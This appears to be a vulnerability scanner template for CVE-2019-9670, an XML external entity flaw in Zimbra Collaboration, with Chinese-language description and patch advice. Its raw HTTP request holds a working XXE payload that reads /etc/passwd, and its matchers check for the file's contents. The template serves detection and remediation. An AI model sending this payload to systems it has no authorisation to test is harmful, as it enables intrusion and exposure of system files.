id: CVE-2019-9670
info:
  name: Synacor Zimbra Collaboration <8.7.11p10 - XML External Entity Injection
  author:
  - l0ne1y
  description: |-
    Zimbra Collaboration Suite XXE漏洞
    Zimbra Collaboration Suite（ZCS）是美国Zimbra公司的一款开源协同办公套件。该产品包括WebMail、日历、通信录等。

    Zimbra ZCS 8.5版本至8.7.11版本中存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://blog.zimbra.com/2019/03/new-zimbra-8-7-11-patch-10/

    临时修复方案：
    1、禁用外部实体
    2、过滤用户提交的XML数据，关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC
requests:
- matchers:
  - type: regex
    condition: and
    part: body
    regex:
    - 'root:.*:0:0:'
    - Problem accessing
  - type: status
    status:
    - 503
  matchers-condition: and
  raw:
  - |
    POST /Autodiscover/Autodiscover.xml HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/xml

    <!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
    <EMailAddress>aaaaa</EMailAddress>
    <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
    </Request>
    </Autodiscover>
